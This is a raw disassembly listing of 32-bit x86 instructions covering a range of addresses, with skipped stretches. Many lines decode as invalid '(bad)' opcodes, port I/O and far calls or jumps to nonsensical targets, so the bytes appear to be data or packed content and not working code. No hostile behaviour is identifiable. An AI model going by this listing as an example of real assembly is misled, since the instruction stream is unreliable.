  421fb9:	push   esi
  421fba:	jmp    0x9b0de627
  421fbf:	test   eax,0xa647f96
  421fc4:	push   0xffffffd6
  421fc6:	loopne 0x422001
  421fc8:	fstp   QWORD PTR [edx-0x65]
  421fcb:	mov    esp,0xf8a790fd
  421fd0:	or     ebp,DWORD PTR [ebx]
  421fd2:	xlat   BYTE PTR ds:[ebx]
  421fd3:	xchg   esp,eax
  421fd4:	(bad)  
  421fd5:	mov    ah,0x16
  421fd7:	push   ds
  421fd8:	iret   
  421fd9:	or     ecx,edi
  421fdb:	(bad)  
  421fdc:	xchg   ebx,eax
  421fdd:	and    eax,0x357036f3
  421fe2:	out    dx,al
  421fe3:	ins    DWORD PTR es:[edi],dx
  421fe4:	cld    
  421fe5:	cwde   
  421fe6:	or     ebp,ebp
  421fe8:	jmp    0x421f74
  421fea:	(bad)  
  421feb:	imul   ebp,esi,0x73
  421fee:	dec    ebx
  421fef:	ficomp DWORD PTR [ebp+0x4]
  421ff2:	jne    0x42202f
  421ff4:	retf   
  421ff5:	jecxz  0x422042
  421ff7:	cmp    bl,dh
  421ff9:	les    eax,FWORD PTR [edx+0x11091494]
  421fff:	cmp    esp,edx
  422001:	call   0xacf8:0x462d9c7b
  422008:	mov    ah,0x7c
  42200a:	repz popf 
  42200c:	add    dh,BYTE PTR [edx]
  42200e:	push   edx
  42200f:	xor    bl,ah
  422011:	call   0x2dfaaa4
  422016:	mul    ecx
  422018:	mov    al,ds:0xe4b32983
  42201d:	cmp    cl,al
  42201f:	jbe    0x42204e
  422021:	enter  0x5e47,0x70
  422025:	stos   BYTE PTR es:[edi],al
  422026:	inc    ecx
  422028:	nop
  422029:	nop
  42202a:	clc    
  42202b:	sub    DWORD PTR [esi],ecx
  42202d:	int    0x5d
  42202f:	icebp  
  422030:	sbb    DWORD PTR [ecx+ecx*4-0x11],ecx
  422034:	mov    al,0x93
  422036:	xor    ch,BYTE PTR ds:0x41d98a0b
  42203c:	in     eax,0x83
  42203e:	fisttp WORD PTR [ecx+esi*8]
  422041:	pop    ebp
  422042:	(bad)  
  422043:	push   ss
  422044:	sbb    ebx,DWORD PTR [ebx-0x4ea0a0de]
  42204a:	cld    
  42204b:	xor    ebx,DWORD PTR [eax]
  42204d:	mov    al,0x59
  42204f:	mov    dh,0xb5
  422051:	push   ds
  422052:	int3   
  422053:	mov    edx,0x15f2cd23
  422058:	fnstsw WORD PTR [eax-0xa08efed]
  42205e:	inc    edi
  42205f:	les    esi,FWORD PTR [edi-0x16]
  422062:	adc    BYTE PTR [eax],0x6e
  422065:	dec    ecx
  422066:	xchg   DWORD PTR ds:0x840636c1,esi
  42206c:	jg     0x4220e9
  42206e:	mov    ecx,0xbc98bc56
  422073:	mov    ebx,0x944d0526
  422078:	call   0xfd90:0x9ffb4c33
  42207f:	call   0x52449e27
  422084:	repnz pop esi
  422086:	mov    ebp,0xc0f34f45
  42208b:	ja     0x4220ab
  42208d:	sbb    ebx,edi
  42208f:	dec    edx
  422090:	inc    ebx
  422091:	mov    WORD PTR [eax+esi*1-0x5308e029],?
  422098:	les    ebx,FWORD PTR [ebp-0x1f]
  42209b:	sub    cl,BYTE PTR [eax+0x719fc6cb]
  4220a1:	cld    
  4220a2:	imul   edi,DWORD PTR [esi],0xffffffaa
  4220a5:	push   edi
  4220a6:	loop   0x4220b5
  4220a8:	adc    eax,0x8bd775b4
  4220ad:	jg     0x42205b
  4220af:	inc    esp
  4220b0:	sub    eax,0xf8d5c4a7
	...
  422115:	add    BYTE PTR [esi-0x284ae],ah
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0x7c5c
  422123:	mov    dl,0xe0
  422125:	pop    ebp
  422126:	push   cs
  422127:	push   0x1
  422129:	add    BYTE PTR [edi],al
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    BYTE PTR [ebp+0x6f],bl
  422130:	jg     0x422166
  422132:	fcmovu st,st(3)
  422134:	pop    esp
  422135:	jae    0x4220f9
  422137:	xlat   BYTE PTR ds:[ebx]
  422138:	mov    ah,0xdb
  42213a:	(bad)  
  42213b:	pop    edx
  42213c:	outs   dx,DWORD PTR ds:[esi]
  42213d:	loope  0x42216a
  42213f:	je     0x422145
  422141:	and    ecx,DWORD PTR [ebp-0x7c]
  422144:	or     BYTE PTR [edi+0x7f],dl
  422147:	jle    0x42211f
  422149:	jbe    0x4220d6
  42214b:	xor    BYTE PTR [esi],ch
  42214d:	pop    edi
  42214e:	into   
  42214f:	in     eax,0xf6
  422151:	jae    0x4220fa
  422153:	sub    BYTE PTR [edx-0x673b081d],dh
  422159:	push   esi
  42215a:	pop    esi
  42215b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42215c:	retf   
  42215d:	and    DWORD PTR [ebp+edi*1+0x6],0x4c
  422162:	push   es
  422163:	sub    BYTE PTR [edi-0x6b],al
  422166:	pop    ecx
  422167:	ds stos DWORD PTR es:[edi],eax
  422169:	(bad)  
  42216a:	(bad)  
  42216b:	mov    BYTE PTR [ebx+0x12b0965c],bh
  422171:	mov    ch,BYTE PTR ds:0x1b40b2dd
  422177:	xor    BYTE PTR [esi],bl
  422179:	out    dx,eax
  42217a:	push   ss
  42217b:	sbb    cl,BYTE PTR [esi+0x46b76cc]
  422181:	test   eax,0xbe95ac04
  422186:	fisttp WORD PTR [ebp+0x1d9c6c6c]
  42218c:	pop    ss
  42218d:	add    DWORD PTR [esi+0xb02e4e3],edi
  422193:	retf   0x4655
  422196:	loop   0x422194
  422198:	lods   eax,DWORD PTR ds:[esi]
  422199:	mov    esp,gs
  42219b:	push   0xffffffc7
  42219d:	xor    eax,0x2efb59d9
  4221a2:	dec    eax
  4221a3:	repnz xor DWORD PTR [esi],edx
  4221a6:	sub    edi,esi
  4221a8:	push   ebp
  4221a9:	dec    esi
  4221aa:	cwde   
  4221ab:	in     al,dx
  4221ac:	pop    esp
  4221ad:	aas    
  4221ae:	jno    0x422187
  4221b0:	ror    DWORD PTR [esi],0x77
  4221b3:	(bad)  
  4221b4:	adc    ch,BYTE PTR [edi]
  4221b6:	mov    ah,0xb1
  4221b8:	ja     0x4221df
  4221ba:	enter  0xf26a,0xd4
  4221be:	push   eax
  4221bf:	xlat   BYTE PTR ds:[ebx]
  4221c0:	pop    esp
  4221c1:	clc    
  4221c2:	xlat   BYTE PTR ds:[ebx]
  4221c3:	cmp    cl,BYTE PTR [esi]
  4221c5:	adc    al,0x6
  4221c7:	lock adc ah,ah
  4221ca:	jnp    0x42223c
  4221cc:	pop    ecx
  4221cd:	mov    eax,ds:0x86405149
  4221d2:	lods   al,BYTE PTR ds:[esi]
  4221d3:	iret   
  4221d4:	fcomp  DWORD PTR [eax]
  4221d6:	mov    eax,0x6f6e4340
  4221db:	push   0x47a38f41
  4221e0:	(bad)  
  4221e1:	call   0x8c21:0x9e1e89c7
  4221e8:	je     0x42218b
  4221ea:	push   ss
  4221eb:	sbb    esp,DWORD PTR [esi-0x5a2e01fb]
  4221f1:	pop    ebx
  4221f2:	mov    ds:0x5f714dc7,eax
  4221f7:	mov    eax,ds:0xa7958f73
  4221fc:	dec    eax
  4221fd:	sub    eax,0x9a456ac0
  422202:	popf   
  422203:	mov    DWORD PTR [edx],esp
  422205:	popa   
  422206:	sbb    eax,0x2703861b
  42220b:	add    ch,bh
  42220d:	fs hlt 
  42220f:	int3   
  422210:	mov    WORD PTR [eax+0x4a],cs
  422213:	cmp    edx,DWORD PTR [ebx-0x74a3f0a9]
  422219:	gs call 0x17a3:0x20d12e7c
  422221:	pop    ds
  422222:	cdq    
  422223:	lea    ebx,[edx+edx*8]
  422226:	mov    al,ds:0x6b32e7ef
  42222b:	pop    edi
  42222c:	mov    ebx,0x315ecf1c
  422231:	or     ebx,DWORD PTR [ebp+0x20]
  422234:	add    BYTE PTR es:[eax],al
	...
  422293:	add    BYTE PTR [eax],al
  422295:	add    BYTE PTR [edi-0x10085213],cl
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    esp,ecx
  4222a3:	and    ebp,DWORD PTR [edx+0x16b1565]
  4222a9:	add    BYTE PTR [edi],al
  4222ab:	add    DWORD PTR [eax],eax
  4222ad:	add    BYTE PTR [eax-0x61],al
  4222b0:	jno    0x422304
  4222b2:	or     DWORD PTR [ebx],ecx
  4222b4:	xor    eax,0x25b3d9bd
  4222b9:	ds out 0x4a,al
  4222bc:	sar    BYTE PTR [edi+0x3],cl
  4222bf:	rcl    BYTE PTR [eax+edi*4+0x14cdc14b],0x2c
  4222c7:	(bad)  
  4222c9:	scas   al,BYTE PTR es:[edi]
  4222ca:	sbb    DWORD PTR gs:[edi+0x37b8812b],eax
  4222d1:	popf   
  4222d2:	hlt    
  4222d3:	sub    DWORD PTR [ecx+0x53],0xffffffa2
  4222d7:	jbe    0x42232e
  4222d9:	loope  0x42228d
  4222db:	adc    al,bh
  4222dd:	or     al,0x84
  4222df:	iret   
  4222e0:	ror    BYTE PTR [ecx-0xa614f8c],0x52
  4222e7:	sbb    al,0x77
  4222e9:	call   0x97cd:0xe1d376a
  4222f0:	(bad)  
  4222f2:	mov    eax,ds:0xbd5e31b6
  4222f7:	sub    eax,0x7309a40c
  4222fc:	jg     0x422316
  4222fe:	pusha  
  4222ff:	inc    ebp
  422300:	adc    DWORD PTR [eax+0x73],ecx
  422303:	xchg   edx,eax
  422304:	and    al,0xf3
  422306:	inc    eax
  422307:	mov    bl,0x1b
  422309:	fwait
  42230a:	icebp  
  42230b:	push   esi
  42230c:	mov    bl,0xce
  42230e:	mov    ah,0xf3
  422310:	stos   DWORD PTR es:[edi],eax
  422311:	lea    esi,[edx]
  422313:	dec    edi
  422314:	mov    bh,0x32
  422316:	(bad)  
  422317:	cli    
  422318:	out    0x80,eax
  42231a:	push   ecx
  42231b:	dec    esp
  42231c:	or     esi,DWORD PTR [eax-0x311294cd]
  422322:	retf   
  422323:	sub    eax,0xcc36a2c2
  422328:	jp     0x4222d3
  42232a:	mov    DWORD PTR [edx],ebx
  42232c:	jmp    0x760ac961
  422331:	in     al,0x52
  422333:	outs   dx,DWORD PTR cs:[esi]
  422335:	test   al,0x71
  422337:	ds hlt 
  422339:	push   ebp
  42233a:	push   ds
  42233b:	shl    DWORD PTR [edi],cl
  42233d:	das    
  42233e:	loope  0x422359
  422340:	jle    0x4222fc
  422342:	lock inc ecx
  422344:	mov    DWORD PTR ds:0x68f713f5,0x2ff6c893
  42234e:	jg     0x422334
  422350:	stos   DWORD PTR es:[edi],eax
  422351:	test   DWORD PTR [ecx],esi
  422353:	mov    eax,DWORD PTR [ebp+0x7c]
  422356:	inc    esp
  422357:	and    al,BYTE PTR [esi+0x7d]
  42235a:	jg     0x42233b
  42235c:	out    0x66,al
  42235e:	fbld   TBYTE PTR [edi]
  422360:	xor    eax,0x9b1c38aa
  422365:	add    DWORD PTR ds:0x7dbd547,esp
  42236b:	mov    ah,0xf2
  42236d:	pop    ss
  42236e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42236f:	fist   WORD PTR [esi+0x58]
  422372:	inc    ecx
  422373:	and    esp,0x41
  422376:	mov    al,0x7a
  422378:	mov    bl,0x6b
  42237a:	pop    ebx
  42237b:	inc    edi
  42237c:	data16 test BYTE PTR [esi-0x75bfd8ff],ch
  422383:	outs   dx,DWORD PTR ds:[esi]
  422384:	fdivr  st,st(7)
  422386:	test   eax,0xc69260fe
  42238b:	(bad)
  42238e:	into   
  42238f:	adc    ebx,DWORD PTR [ecx+0x6e9bbe47]
  422395:	int    0xe4
  422397:	add    dh,BYTE PTR [ebx]
  422399:	push   ss
  42239a:	retf   0x17f6
  42239d:	cli    
  42239e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42239f:	pop    eax
  4223a0:	dec    esp
  4223a1:	dec    esp
  4223a2:	pop    ebx
  4223a3:	lahf   
  4223a4:	jnp    0x42239b
  4223a6:	data16 and al,0xd0
  4223a9:	sbb    bh,bl
  4223ab:	call   FWORD PTR [ebp+ecx*2+0x41]
  4223af:	sbb    DWORD PTR [ebx],ebx
  4223b1:	rcl    BYTE PTR [ebx],1
  4223b3:	or     dh,BYTE PTR [eax+0x0]
	...
  422415:	add    BYTE PTR [edx-0x7e],dl
  422418:	cs imul edi,esi,0x88bb57ed
  42241f:	adc    eax,0xb96465b6
  422424:	lods   al,BYTE PTR ds:[esi]
  422425:	mov    al,ds:0x16c1c
  42242a:	pop    es
  42242b:	add    DWORD PTR [eax],eax
  42242d:	add    BYTE PTR [ebx],cl
  42242f:	or     BYTE PTR [ecx+0x36],dh
  422432:	mov    dl,0xab
  422434:	dec    esp
  422435:	push   0x824aff6f
  42243a:	sub    BYTE PTR [edx+0x75],dl
  42243d:	js     0x42242a
  42243f:	dec    eax
  422440:	mov    BYTE PTR [esi-0x62],ah
  422443:	(bad)  
  422444:	mul    ch
  422446:	mov    dl,0xe7
  422448:	mov    ecx,0x943eed95
  42244d:	adc    al,0xc2
  42244f:	pop    DWORD PTR [edx+edi*1-0x715e934d]
  422456:	lahf   
  422457:	push   ebp
  422458:	dec    ecx
  422459:	mov    al,0x6b
  42245b:	adc    BYTE PTR [ebx],ah
  42245d:	push   esp
  42245e:	push   esi
  42245f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422460:	add    eax,0xe1a287a
  422465:	into   
  422466:	je     0x422403
  422468:	sbb    bh,0xb3
  42246b:	repnz push edi
  42246d:	stos   BYTE PTR es:[edi],al
  42246e:	mov    esp,DWORD PTR [esi-0x1d]
  422471:	mov    BYTE PTR [ebx],cl
  422473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422474:	cmp    eax,0x4a1ce4e8
  422479:	pop    ds
  42247a:	mov    ch,BYTE PTR [edx]
  42247c:	neg    BYTE PTR [ebp+eiz*8-0x5b]
  422480:	lock add al,0x12
  422483:	jo     0x422440
  422485:	loope  0x422505
  422487:	or     al,0x64
  422489:	sar    BYTE PTR [ebp+0x5b],cl
  42248c:	ja     0x42248b
  42248e:	and    bh,BYTE PTR [edi]
  422490:	pop    ds
  422491:	jp     0x4224b2
  422493:	sahf   
  422494:	ss stos BYTE PTR es:[edi],al
  422496:	adc    BYTE PTR [edx-0x5fcd4c2a],ch
  42249c:	int3   
  42249d:	xchg   esp,eax
  42249e:	xchg   esi,eax
  42249f:	push   0xf7e5b68c
  4224a4:	sub    ch,BYTE PTR [eax]
  4224a6:	fs (bad) 
  4224a8:	dec    BYTE PTR [ebx+ebp*4]
  4224ab:	inc    ebx
  4224ac:	xchg   ebx,eax
  4224ad:	mov    ds:0x22a0916a,al
  4224b2:	sub    dl,BYTE PTR [ebx]
  4224b4:	fs stc 
  4224b6:	add    DWORD PTR [esi-0x14191180],esi
  4224bc:	adc    DWORD PTR [esi+0x57b682e],esi
  4224c2:	add    BYTE PTR [ebp-0x3842d63c],0xc8
  4224c9:	add    DWORD PTR [ecx+0x556c709e],0xa9bbf9be
  4224d3:	dec    edx
  4224d5:	pushf  
  4224d6:	cmp    BYTE PTR [ecx-0x1af7e28d],ch
  4224dc:	ins    BYTE PTR es:[edi],dx
  4224dd:	push   ds
  4224de:	into   
  4224df:	jmp    0x4d09:0xd0d40882
  4224e6:	fsubr  st(2),st
  4224e8:	fistp  WORD PTR [eax+ecx*2+0x24]
  4224ec:	fsub   DWORD PTR [esi+ecx*4]
  4224ef:	in     eax,0x8a
  4224f1:	in     eax,0x83
  4224f3:	repz sahf 
  4224f5:	dec    edi
  4224f6:	cs cmps DWORD PTR gs:[si],DWORD PTR es:[di]
  4224fa:	mov    ds:0xccfd5551,al
  4224ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422500:	push   esp
  422501:	jl     0x422580
  422503:	loopne 0x4224d9
  422505:	cmp    edi,esi
  422507:	sbb    BYTE PTR [edx+0x490b6fcd],al
  42250d:	or     ebx,DWORD PTR [ecx+0x430b8958]
  422513:	stos   DWORD PTR es:[edi],eax
  422514:	fsub   QWORD PTR [edx+0x75a123db]
  42251a:	xchg   edx,eax
  42251b:	jmp    0x447f93d5
  422520:	xchg   BYTE PTR [ebp-0x70],dl
  422523:	pop    edx
  422524:	inc    edx
  422525:	cdq    
  422526:	ret    
  422527:	adc    ecx,esp
  422529:	mov    bh,0x99
  42252b:	xor    cl,al
  42252d:	je     0x42258f
  42252f:	jp     0x422526
  422531:	xchg   DWORD PTR [eax-0x2c],esi
  422534:	mov    ebp,0x0
	...
  422595:	add    BYTE PTR [edx-0x40887052],bl
  42259b:	ja     0x422597
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fadd   st,st(5)
  4225a3:	jge    0x42258b
  4225a5:	xchg   ebp,eax
  4225a6:	and    ebp,DWORD PTR [ebp+0x1]
  4225a9:	add    BYTE PTR [edi],al
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [eax+0x54b78a08],al
  4225b3:	inc    esi
  4225b4:	mov    cl,0xe8
  4225b6:	mov    cl,0xc5
  4225b8:	xchg   ebx,eax
  4225b9:	cmc    
  4225ba:	xchg   edi,eax
  4225bb:	bound  ebx,QWORD PTR [esi]
  4225bd:	(bad)  
  4225be:	sbb    bl,BYTE PTR [eax+ebp*8+0x3c]
  4225c2:	add    bh,BYTE PTR [ecx+0x11]
  4225c5:	call   0x80ae832a
  4225ca:	xchg   ecx,eax
  4225cb:	stc    
  4225cc:	or     esp,esi
  4225ce:	inc    edi
  4225cf:	sbb    al,BYTE PTR [ebp-0x3c]
  4225d2:	xchg   eax,ebp
  4225d4:	pop    eax
  4225d5:	retf   0x11e7
  4225d8:	data16 jl 0x42258a
  4225db:	mov    gs,eax
  4225dd:	test   esi,esp
  4225df:	(bad)  
  4225e0:	cld    
  4225e1:	cli    
  4225e2:	aam    0x33
  4225e4:	xor    BYTE PTR [edx-0xb31ee4e],bh
  4225ea:	out    0x66,eax
  4225ec:	xchg   edi,eax
  4225ed:	add    eax,0x49ca5cd5
  4225f2:	jnp    0x4225b8
  4225f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225f5:	mov    eax,0x16ab5797
  4225fa:	test   DWORD PTR [ebx],ecx
  4225fc:	sub    BYTE PTR [esi],ah
  4225fe:	loope  0x422639
  422600:	sub    BYTE PTR ds:0x61df4f83,bl
  422606:	mov    bh,BYTE PTR [ecx+esi*8-0x57]
  42260a:	fisttp DWORD PTR [edx+0x147492fa]
  422610:	xor    esi,DWORD PTR [ebx-0x5f]
  422613:	push   esi
  422614:	or     al,0xc5
  422616:	mov    ch,0xa3
  422618:	adc    al,0xb9
  42261a:	lahf   
  42261b:	fsub   DWORD PTR [ebx+0x2d]
  42261e:	jle    0x42265c
  422620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422621:	xlat   BYTE PTR ds:[ebx]
  422622:	aam    0x9
  422624:	outs   dx,BYTE PTR ds:[esi]
  422625:	cmp    cl,BYTE PTR [ecx+ebp*8]
  422628:	dec    edx
  422629:	ret    0x2316
  42262c:	mov    ds:0x94431b39,eax
  422631:	xor    DWORD PTR [ecx+0x2d],ebp
  422634:	push   edx
  422635:	shr    BYTE PTR [edx],cl
  422637:	dec    edx
  422638:	gs loopne 0x42269d
  42263b:	ror    dl,cl
  42263d:	push   ebx
  42263e:	imul   ebx,DWORD PTR [edx+0x47],0xc975d5fe
  422645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422646:	inc    edx
  422647:	cs inc eax
  422649:	and    bh,BYTE PTR [ecx]
  42264b:	ficom  DWORD PTR [edi]
  42264d:	ja     0x4226a3
  42264f:	out    dx,al
  422650:	lds    esp,FWORD PTR [ecx]
  422652:	ficomp DWORD PTR [edi]
  422654:	lods   al,BYTE PTR ds:[esi]
  422655:	mov    gs,WORD PTR [ebp-0x391a2e96]
  42265b:	loopne 0x4225e6
  42265d:	lods   eax,DWORD PTR ds:[esi]
  42265e:	pushf  
  42265f:	(bad)  
  422660:	dec    edi
  422661:	lods   al,BYTE PTR ds:[esi]
  422662:	rol    DWORD PTR [ebp-0xf],cl
  422665:	inc    BYTE PTR [edx-0x7]
  422668:	je     0x42262b
  42266a:	sbb    dh,BYTE PTR [ecx-0x7c]
  42266d:	scas   al,BYTE PTR es:[edi]
  42266e:	xchg   dh,bl
  422670:	inc    ecx
  422671:	push   ds
  422672:	lock inc ebx
  422674:	sub    eax,0xbd885f47
  422679:	jmp    0x9a1e:0x3ddc73ba
  422680:	not    ecx
  422682:	mov    edi,ds
  422684:	adc    al,BYTE PTR [eax-0x63c3f860]
  42268a:	jb     0x422686
  42268c:	shr    BYTE PTR [ecx-0x72],cl
  42268f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422690:	xor    ecx,DWORD PTR [eax-0x2b]
  422693:	xor    DWORD PTR [ecx-0x4b],esp
  422696:	mov    bl,0x11
  422698:	pop    eax
  422699:	mov    WORD PTR [ebx+edi*2-0x25],ds
  42269d:	mov    WORD PTR [ecx],?
  42269f:	mov    ecx,0xd6dbe487
  4226a4:	and    DWORD PTR [edi+0xe],edi
  4226a7:	add    ecx,esi
  4226a9:	pop    edx
  4226aa:	inc    eax
  4226ab:	sti    
  4226ac:	sbb    DWORD PTR [ecx-0x10],eax
  4226af:	and    eax,0x64b46603
  4226b4:	rol    DWORD PTR [eax],1
	...
  422716:	daa    
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	stos   BYTE PTR es:[edi],al
  422723:	in     eax,0xa8
  422725:	mov    al,0x2a
  422727:	outs   dx,BYTE PTR ds:[esi]
  422728:	add    DWORD PTR [eax],eax
  42272a:	pop    es
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    bl,cl
  42272f:	cmc    
  422730:	sahf   
  422731:	pop    edi
  422732:	xor    eax,DWORD PTR [ebp+0x60a2cf20]
  422738:	add    ebp,esi
  42273a:	push   esp
  42273b:	add    BYTE PTR [esi+0x3d376620],dl
  422741:	mov    dl,0xbc
  422743:	stc    
  422744:	addr16 mov bh,0xcd
  422747:	ss mov edx,0xb0707964
  42274d:	hlt    
  42274e:	arpl   WORD PTR [edx+0x2d3a5fcd],bp
  422754:	xor    al,0x4
  422756:	cld    
  422757:	shl    BYTE PTR [eax-0x45],cl
  42275a:	or     DWORD PTR ds:0xf3c7cbd4,esp
  422760:	dec    ecx
  422761:	xchg   edi,eax
  422762:	jecxz  0x42277c
  422764:	out    dx,al
  422765:	aam    0x11
  422767:	(bad)  
  422768:	pop    ds
  422769:	jmp    0xf7a6:0x5fcab8f8
  422770:	add    DWORD PTR [edx-0x743677d6],ecx
  422776:	jbe    0x422751
  422778:	test   al,0x80
  42277a:	retf   0x5845
  42277d:	leave  
  42277e:	or     ecx,esp
  422780:	mov    edi,0x9360202f
  422785:	pop    ebx
  422786:	pop    edi
  422787:	popa   
  422788:	xchg   ebp,eax
  422789:	jmp    DWORD PTR gs:[eax]
  42278c:	push   ss
  42278d:	outs   dx,DWORD PTR ds:[esi]
  42278e:	das    
  42278f:	xor    bl,BYTE PTR [esi]
  422791:	push   ds
  422792:	push   edi
  422793:	fwait
  422794:	sbb    ebx,DWORD PTR [edx-0x12]
  422797:	sub    BYTE PTR [edx-0x17],bl
  42279a:	xor    BYTE PTR [ecx+0x53],dl
  42279d:	stos   DWORD PTR es:[edi],eax
  42279e:	jmp    0x422798
  4227a0:	mov    ebp,0x4429542a
  4227a5:	cs xor ebp,esi
  4227a8:	add    ah,ch
  4227aa:	pop    ecx
  4227ab:	in     al,0x6a
  4227ad:	js     0x422817
  4227af:	outs   dx,BYTE PTR ds:[esi]
  4227b0:	mov    bh,BYTE PTR [edi]
  4227b2:	lds    eax,FWORD PTR [edi+0x1468afaf]
  4227b8:	jae    0x422787
  4227ba:	xor    dh,ch
  4227bc:	dec    esi
  4227bd:	push   ss
  4227be:	jae    0x4227d5
  4227c0:	jbe    0x4227aa
  4227c2:	lahf   
  4227c3:	ror    DWORD PTR [eax-0xde861fe],0x7b
  4227ca:	retf   0xd88b
  4227cd:	dec    edx
  4227ce:	and    edx,DWORD PTR [ebx+eiz*4+0x61]
  4227d2:	sbb    esi,ecx
  4227d4:	mov    eax,0x2a4b3556
  4227d9:	cmp    eax,0x8f21c092
  4227de:	xchg   esi,eax
  4227df:	xchg   ebp,eax
  4227e0:	push   edx
  4227e1:	mov    ebx,0x69f2521
  4227e6:	and    bh,BYTE PTR [ebx-0x49]
  4227e9:	add    eax,0x4edb82a2
  4227ee:	jle    0x422795
  4227f0:	sbb    DWORD PTR [edi-0x740aa42a],ecx
  4227f6:	jo     0x42284f
  4227f8:	aad    0x30
  4227fa:	xor    BYTE PTR [ebp-0x7c],bl
  4227fd:	sbb    DWORD PTR [eax+0x6cf3323a],esi
  422803:	imul   esi,DWORD PTR [eax-0x3eab9373],0xb2ca7ee1
  42280d:	adc    ecx,0x13
  422810:	mov    edi,0xf028e83c
  422815:	mov    ss,WORD PTR [ebp+0x473a729e]
  42281b:	xchg   ebx,eax
  42281c:	dec    ebx
  42281d:	or     DWORD PTR [ebx],edi
  42281f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422820:	loopne 0x4227b5
  422822:	add    eax,0x3f637ce
  422827:	adc    dh,BYTE PTR [ebx-0x322dc682]
  42282d:	(bad)  
  42282f:	pop    ss
  422830:	rcr    BYTE PTR [edx-0x4f],1
  422833:	test   eax,0xce
	...
  422894:	add    BYTE PTR [eax],al
  422896:	int    0x39
  422898:	mov    eax,0xef97fc97
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [eax+ecx*4]
  4228a3:	jns    0x422855
  4228a5:	loop   0x4228d8
  4228a7:	outs   dx,DWORD PTR ds:[esi]
  4228a8:	add    DWORD PTR [eax],eax
  4228aa:	pop    es
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    BYTE PTR [ecx+0x72a304e8],dh
  4228b3:	adc    eax,DWORD PTR [edx+0x3]
  4228b6:	cld    
  4228b7:	std    
  4228b8:	xchg   ecx,eax
  4228b9:	into   
  4228ba:	adc    DWORD PTR [ebp-0x3a],eax
  4228bd:	sbb    edi,DWORD PTR [edi-0x2e2243d2]
  4228c3:	dec    edi
  4228c4:	(bad)  
  4228c5:	sub    DWORD PTR [edi-0x5b84ab75],eax
  4228cb:	jae    0x4228c7
  4228cd:	jns    0x42293b
  4228cf:	sub    BYTE PTR [ecx+0xace7981],al
  4228d5:	loope  0x4228e0
  4228d7:	jmp    0x9c31:0xc5d41f00
  4228de:	adc    eax,edx
  4228e0:	ret    0x168e
  4228e3:	into   
  4228e4:	(bad)  
  4228e5:	lods   al,BYTE PTR ds:[esi]
  4228e6:	nop
  4228e7:	mov    ds,WORD PTR [edx-0x21422f24]
  4228ed:	pushf  
  4228ee:	ret    
  4228ef:	jmp    edi
  4228f1:	mov    ah,0xe
  4228f3:	mov    edi,0xb522fe5c
  4228f8:	std    
  4228f9:	push   edi
  4228fa:	(bad)  
  4228fb:	(bad)  
  4228fc:	out    dx,al
  4228fd:	mov    WORD PTR ds:0xe8f60610,cs
  422903:	aaa    
  422904:	inc    ebx
  422905:	lahf   
  422906:	shr    DWORD PTR [edx+0x73],cl
  422909:	jno    0x4228a0
  42290b:	xchg   DWORD PTR [edi-0x5beda339],esp
  422911:	iret   
  422912:	mov    ah,0x9c
  422914:	xchg   ecx,eax
  422915:	js     0x4228dd
  422917:	push   ecx
  422918:	add    al,0xd3
  42291a:	mov    eax,ds:0x346a9b49
  42291f:	sahf   
  422920:	scas   al,BYTE PTR es:[edi]
  422921:	push   ecx
  422922:	inc    edx
  422923:	push   ss
  422924:	dec    esi
  422925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422926:	inc    ecx
  422927:	fwait
  422928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422929:	aad    0x16
  42292b:	sub    DWORD PTR [edi+0x151a629e],edx
  422931:	add    DWORD PTR [edi],ebx
  422933:	mov    ebx,0x1c5b7711
  422938:	arpl   WORD PTR [ecx],bx
  42293a:	fwait
  42293b:	push   ebx
  42293c:	mov    ds:0x2ad9eee6,eax
  422941:	jbe    0x422943
  422943:	dec    esp
  422944:	add    esp,DWORD PTR [ecx-0x19]
  422947:	or     al,0xc6
  422949:	push   0x11
  42294b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42294c:	std    
  42294d:	add    bh,BYTE PTR [ecx+0x4861d8a6]
  422953:	push   ss
  422954:	jb     0x42298a
  422956:	inc    esi
  422957:	mov    ecx,DWORD PTR [edi+0x1e5a7d1b]
  42295d:	inc    edx
  42295e:	xchg   ebp,eax
  42295f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  422961:	stos   DWORD PTR es:[edi],eax
  422962:	(bad)  
  422963:	ins    DWORD PTR es:[edi],dx
  422964:	js     0x42294f
  422966:	cmp    BYTE PTR [edi+0x7723b840],0xcb
  42296d:	pop    ebx
  42296e:	in     al,dx
  42296f:	js     0x4229dc
  422971:	and    BYTE PTR ds:0x4d37fb9c,cl
  422977:	lea    ebx,[ebx+0x31]
  42297a:	mov    edx,0x264554d1
  42297f:	shl    BYTE PTR [esi-0x6],cl
  422982:	jae    0x422908
  422984:	cmp    al,0x91
  422986:	xchg   esi,eax
  422987:	shl    DWORD PTR [esp+ebp*2+0x75da9203],cl
  42298e:	jnp    0x422915
  422990:	shl    ch,cl
